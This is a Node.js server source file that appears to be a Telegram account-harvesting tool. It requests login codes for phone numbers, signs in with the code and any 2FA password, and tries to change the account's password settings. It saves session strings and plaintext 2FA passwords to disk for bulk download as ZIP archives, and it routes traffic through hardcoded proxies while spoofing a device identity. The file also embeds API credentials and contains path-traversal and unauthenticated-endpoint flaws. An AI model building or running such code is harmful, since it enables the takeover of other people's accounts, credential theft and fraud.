const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const archiver = require('archiver');
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram/tl");

// Telegram API credentials
const apiId = 29176644;
const apiHash = "779da7ab84c393d0bec09d1be3918dec";

// Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.static('public'));
app.use(bodyParser.json({ limit: "10mb" }));
app.use(bodyParser.urlencoded({ extended: true }));

// Serve HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Bot start
require("./bot");

// Base storage - auto create
const BASE = path.join(__dirname, "sessionStore");
if (!fs.existsSync(BASE)) fs.mkdirSync(BASE);

// Files for data storage - auto create
const USERS_FILE = path.join(__dirname, 'users.json');
const USED_PHONES_FILE = path.join(__dirname, 'usedPhones.json');

// Ensure files exist
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]');
if (!fs.existsSync(USED_PHONES_FILE)) fs.writeFileSync(USED_PHONES_FILE, '[]');

// Load users
function loadUsers() {
    try {
        const data = fs.readFileSync(USERS_FILE, 'utf8');
        return JSON.parse(data) || [];
    } catch (e) {
        return [];
    }
}

// Save users
function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
}

// Load used phones
function loadUsedPhones() {
    try {
        const data = fs.readFileSync(USED_PHONES_FILE, 'utf8');
        return JSON.parse(data) || [];
    } catch (e) {
        return [];
    }
}

// Save used phones
function saveUsedPhones(phones) {
    fs.writeFileSync(USED_PHONES_FILE, JSON.stringify(phones, null, 2), 'utf8');
}

// Check if phone is used
function isPhoneUsed(phone) {
    const phones = loadUsedPhones();
    return phones.includes(phone);
}

// Mark phone as used
function markPhoneUsed(phone) {
    const phones = loadUsedPhones();
    if (!phones.includes(phone)) {
        phones.push(phone);
        saveUsedPhones(phones);
    }
}

// User folder
function getUserFolder(token) {
    const safe = token.replace(/[^a-zA-Z0-9_-]/g, "_");
    const folder = path.join(BASE, safe);
    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
    return folder;
}

// OTP temp storage
let temp = {};

// Load country proxies (updated version)
function loadCountryProxies() {
    try {
        const data = fs.readFileSync(path.join(__dirname, 'countryProxies.json'), 'utf-8');
        return JSON.parse(data);
    } catch (e) {
        console.log("Using default proxies");
        return {
            "BD": [{ ip: "103.125.173.94", port: 1080, socksType: 5 }],
            "IN": [{ ip: "103.216.51.210", port: 6667, socksType: 5 }],
            "US": [{ ip: "104.200.135.46", port: 4145, socksType: 5 }]
        };
    }
}

// Get random proxy from array
function getRandomProxy(proxies) {
    if (!proxies || proxies.length === 0) return null;
    const randomIndex = Math.floor(Math.random() * proxies.length);
    return proxies[randomIndex];
}

// Get country code from number (updated with more countries)
function getCountryCodeFromNumber(number) {
    const match = number.match(/^\+?(\d{1,3})/);
    if (!match) return null;
    const code = match[1];
    
    const countryMap = {
        "880": "BD",  // Bangladesh
        "91": "IN",   // India
        "1": "US",    // USA/Canada
        "31": "NL",   // Netherlands
        "65": "SP",   // Singapore
        "27": "SA",   // South Africa
        "44": "GB",   // UK
        "33": "FR",   // France
        "49": "DE",   // Germany
        "7": "RU",    // Russia
        "81": "JP",   // Japan
        "82": "KR",   // South Korea
        "61": "AU",   // Australia
        "92": "PK",   // Pakistan
        "971": "AE",  // UAE
        "20": "EG",   // Egypt
        "90": "TR",   // Turkey
        "34": "ES",   // Spain
        "39": "IT",   // Italy
        "86": "CN",   // China
        "62": "ID",   // Indonesia
        "60": "MY",   // Malaysia
        "63": "PH",   // Philippines
        "66": "TH",   // Thailand
        "84": "VN",   // Vietnam
        "55": "BR",   // Brazil
        "52": "MX",   // Mexico
        "54": "AR",   // Argentina
        "57": "CO",   // Colombia
        "58": "VE"    // Venezuela
    };
    
    return countryMap[code] || null;
}

// Helper function for connection attempt
async function attemptConnection(proxy, phone, token) {
    let clientConfig = {
        connectionRetries: 3,
        deviceModel: "Samsung Galaxy S23",
        systemVersion: "Android 13",
        appVersion: "12.2.10",
        langCode: "en",
        useWSS: false,
        timeout: 30000,
        retryDelay: 1000
    };

    if (proxy && proxy.port) {
        clientConfig.proxy = {
            ip: proxy.ip,
            port: proxy.port,
            socksType: proxy.socksType || 5
        };
        console.log(`Using proxy: ${proxy.ip}:${proxy.port} (${proxy.socksType || 5})`);
    } else {
        console.log(`No proxy used for ${phone}`);
    }

    const session = new StringSession("");
    const client = new TelegramClient(session, apiId, apiHash, clientConfig);

    client._connection._timeout = 45000;
    client._timeout = 45000;
    client.setLogLevel("none");

    try {
        await client.connect();
        console.log(`Connected for ${phone}`);
    } catch (connectErr) {
        console.log(`Connection failed: ${connectErr.message}`);
        throw connectErr;
    }

    // Auto disconnect after 2 minutes
    setTimeout(() => {
        try { client.disconnect(); } catch { }
    }, 120000);

    try {
        const sent = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId,
                apiHash,
                settings: new Api.CodeSettings({
                    allow_flashcall: false,
                    current_number: false,
                    allow_app_hash: true,
                }),
            })
        );

        temp[phone] = { client, session, hash: sent.phoneCodeHash, time: Date.now() };
        
        return {
            ok: true, 
            message: "OTP sent successfully", 
            status: "PROCESSING",
            proxyUsed: proxy ? `${proxy.ip}:${proxy.port}` : "No proxy",
            country: getCountryCodeFromNumber(phone)
        };
    } catch (apiErr) {
        console.log(`API error: ${apiErr.message}`);
        try { client.disconnect(); } catch { }
        throw apiErr;
    }
}

// ------------ ROUTES ------------

// Create new user
app.post('/newuser', (req, res) => {
    const { username, token } = req.body;
    if (!username || !token) return res.json({ ok: false, error: 'Missing username or token' });

    const users = loadUsers();
    const exists = users.find(u => u.username.toLowerCase() === username.toLowerCase());
    if (exists) return res.json({ ok: false, error: 'Username already exists' });

    users.push({ username, token, createdAt: new Date().toISOString() });
    saveUsers(users);
    res.json({ ok: true, message: 'User created successfully' });
});

// Send OTP
app.post("/sendOtp", async (req, res) => {
    const { countryCode, token } = req.body;
    const phone = countryCode + req.body.phone;

    if (!phone || !token || !countryCode) {
        return res.json({ ok: false, error: "Phone/token/countryCode required" });
    }

    console.log(`OTP request for: ${phone}, Token: ${token}`);

    // Check if phone already used
    if (isPhoneUsed(phone)) {
        console.log(`Phone ${phone} already used`);
        return res.json({ 
            ok: false, 
            error: "ALREADY_USED", 
            message: "এই নম্বরটি ইতিমধ্যে ব্যবহার করা হয়েছে।",
            status: "USED"
        });
    }

    const countryProxies = loadCountryProxies();
    const country = getCountryCodeFromNumber(countryCode);
    
    console.log(`Country detected: ${country} for code ${countryCode}`);
    
    // Get proxies for country
    const countryProxyList = countryProxies[country] || [];
    console.log(`Available proxies for ${country}: ${countryProxyList.length}`);
    
    // Try each proxy until success
    let lastError = null;
    
    // If no proxies for country, try without proxy first
    if (countryProxyList.length === 0) {
        console.log(`No proxies for ${country}, trying direct connection`);
        try {
            const result = await attemptConnection(null, phone, token);
            return res.json(result);
        } catch (err) {
            lastError = err;
        }
    }
    
    // Try with proxies (max 3 attempts)
    for (let i = 0; i < Math.min(countryProxyList.length, 3); i++) {
        const proxy = getRandomProxy(countryProxyList);
        
        if (!proxy) {
            continue;
        }
        
        console.log(`Attempt ${i + 1}: Trying proxy ${proxy.ip}:${proxy.port} for ${country}`);
        
        try {
            const result = await attemptConnection(proxy, phone, token);
            console.log(`Proxy ${proxy.ip} success for ${phone}`);
            return res.json(result);
        } catch (err) {
            lastError = err;
            console.log(`Proxy ${proxy.ip} failed: ${err.message}`);
            // Remove failed proxy from list for this attempt
            const index = countryProxyList.indexOf(proxy);
            if (index > -1) {
                countryProxyList.splice(index, 1);
            }
        }
    }
    
    // All proxies failed, try without proxy
    console.log(`All proxies failed for ${country}, trying without proxy`);
    try {
        const result = await attemptConnection(null, phone, token);
        return res.json(result);
    } catch (err) {
        console.log(`Direct connection also failed: ${err.message}`);
        return res.json({ 
            ok: false, 
            error: lastError?.message || err.message, 
            status: "ERROR",
            message: "All connection attempts failed. Please try again."
        });
    }
});

// Verify OTP
app.post("/verify", async (req, res) => {
    const { phone, code, password, token } = req.body;
    
    console.log(`Verification attempt for: ${phone}, Code: ${code ? "***" : "missing"}`);
    
    if (!temp[phone]) {
        console.log(`No temp session for ${phone}`);
        return res.json({ ok: false, error: "Session expired", status: "TIMEOUT" });
    }

    const { client, session, hash, time } = temp[phone];

    // OTP timeout: 3 minutes
    if (Date.now() - time > 180000) {
        console.log(`OTP timeout for ${phone}`);
        try { client.disconnect(); } catch { }
        delete temp[phone];
        return res.json({ ok: false, error: "OTP timeout expired", status: "TIMEOUT" });
    }

    try {
        let result;
        try {
            console.log(`Attempting sign in for ${phone}`);
            result = await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCode: code,
                    phoneCodeHash: hash,
                })
            );
            console.log(`Sign in successful for ${phone}`);
        } catch (err) {
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                console.log(`2FA required for ${phone}`);
                if (!password) {
                    return res.json({ ok: false, error: "2FA_PASSWORD_REQUIRED", status: "2FA_NEEDED" });
                }
                console.log(`Using 2FA password for ${phone}`);
                result = await client.invoke(
                    new Api.auth.CheckPassword({ password })
                );
            } else {
                console.log(`Sign in error: ${err.message}`);
                throw err;
            }
        }

        // Auto enable 2FA
        console.log(`Attempting to enable 2FA for ${phone}`);
        try {
            await client.invoke(
                new Api.account.UpdatePasswordSettings({
                    password: password || "",
                    newSettings: new Api.account.PasswordInputSettings({
                        newAlgo: new Api.PasswordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow({
                            salt1: Buffer.alloc(8),
                            salt2: Buffer.alloc(8),
                            g: 2,
                            p: Buffer.alloc(256),
                        }),
                        newPasswordHash: Buffer.alloc(0),
                        hint: "Enabled by Session Manager",
                        email: "",
                        newSecureSettings: undefined,
                    }),
                })
            );
            console.log(`2FA enabled for ${phone}`);
        } catch (twoFaErr) {
            console.log(`2FA enable failed: ${twoFaErr.message}`);
            // Continue even if 2FA enable fails
        }

        const userFolder = getUserFolder(token);
        const fileName = "session_" + Date.now() + ".txt";
        const filePath = path.join(userFolder, fileName);

        const sessionData = {
            sessionString: session.save(),
            phone: phone,
            timestamp: Date.now(),
            has2FA: !!password,
            twoFAPassword: password || null,
            country: getCountryCodeFromNumber(phone),
            createdAt: new Date().toISOString()
        };

        fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));
        markPhoneUsed(phone);

        try { client.disconnect(); } catch { }
        delete temp[phone];

        console.log(`Session created successfully for ${phone}: ${fileName}`);

        return res.json({
            ok: true,
            file: fileName,
            message: "Session created with 2FA enabled",
            status: "VERIFIED",
            has2FA: !!password
        });
    } catch (err) {
        console.log(`Verification error for ${phone}: ${err.message}`);
        return res.json({ ok: false, error: err.message, status: "ERROR" });
    }
});

// Get session list
app.get("/sessionList", (req, res) => {
    const token = req.query.token;
    console.log(`Session list request for token: ${token}`);
    
    const folder = getUserFolder(token);

    if (!fs.existsSync(folder)) {
        console.log(`Folder not found for token: ${token}`);
        return res.json([]);
    }

    const files = fs.readdirSync(folder)
        .filter(f => f.endsWith('.txt'))
        .map(f => {
            const stats = fs.statSync(path.join(folder, f));
            try {
                const content = JSON.parse(fs.readFileSync(path.join(folder, f), 'utf8'));
                return {
                    name: f,
                    size: stats.size,
                    phone: content.phone || 'Unknown',
                    has2FA: content.has2FA || false,
                    timestamp: content.timestamp || stats.mtimeMs,
                    country: content.country || 'Unknown',
                    createdAt: content.createdAt || new Date(stats.mtimeMs).toISOString()
                };
            } catch {
                return {
                    name: f,
                    size: stats.size,
                    phone: 'Unknown',
                    has2FA: false,
                    timestamp: stats.mtimeMs,
                    country: 'Unknown',
                    createdAt: new Date(stats.mtimeMs).toISOString()
                };
            }
        });

    console.log(`Returning ${files.length} sessions for token: ${token}`);
    res.json(files);
});

// View session
app.get("/view/:file", (req, res) => {
    const token = req.query.token;
    const folder = getUserFolder(token);
    const filePath = path.join(folder, req.params.file);
    
    console.log(`View request: ${req.params.file} for token: ${token}`);
    
    if (!fs.existsSync(filePath)) {
        console.log(`File not found: ${filePath}`);
        return res.status(404).send("File not found");
    }

    try {
        const content = fs.readFileSync(filePath, 'utf8');
        const parsed = JSON.parse(content);
        res.json(parsed);
    } catch {
        res.sendFile(filePath);
    }
});

// Download session
app.get("/download/:file", (req, res) => {
    const token = req.query.token;
    const folder = getUserFolder(token);
    const filePath = path.join(folder, req.params.file);
    
    console.log(`Download request: ${req.params.file} for token: ${token}`);
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).send("File not found");
    }
    res.download(filePath);
});

// Zip sessions
app.post("/zip", (req, res) => {
    const { token, files } = req.body;
    console.log(`ZIP request for ${files.length} files, token: ${token}`);
    
    const folder = getUserFolder(token);

    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", "attachment; filename=telegram_sessions.zip");

    const archive = archiver("zip", { zlib: { level: 9 } });
    archive.pipe(res);

    files.forEach(f => {
        const fp = path.join(folder, f);
        if (fs.existsSync(fp)) {
            archive.file(fp, { name: f });
            console.log(`Added to ZIP: ${f}`);
        } else {
            console.log(`File not found for ZIP: ${f}`);
        }
    });

    archive.on('error', (err) => {
        console.log(`ZIP error: ${err.message}`);
        res.status(500).send({ error: err.message });
    });

    archive.finalize();
    console.log(`ZIP created successfully`);
});

// Check phone
app.post("/checkPhone", (req, res) => {
    const { phone } = req.body;
    console.log(`Phone check request: ${phone}`);
    
    if (!phone) return res.json({ ok: false, error: "Phone required" });
    
    const isUsed = isPhoneUsed(phone);
    console.log(`Phone ${phone} is ${isUsed ? 'used' : 'available'}`);
    
    res.json({ ok: true, isUsed, phone });
});

// Get all users (admin)
app.get('/users', (req, res) => {
    const users = loadUsers();
    console.log(`Users list request, returning ${users.length} users`);
    res.json(users);
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        ok: true, 
        status: 'running', 
        time: new Date().toISOString(),
        sessionStore: fs.existsSync(BASE) ? 'exists' : 'not exists',
        usersCount: loadUsers().length,
        usedPhonesCount: loadUsedPhones().length
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`✅ Server running → http://localhost:${PORT}`);
    console.log(`📁 Session Store: ${BASE}`);
    console.log(`👥 Users file: ${USERS_FILE}`);
    console.log(`📱 Used phones file: ${USED_PHONES_FILE}`);
    console.log(`🤖 Bot is running...`);
});
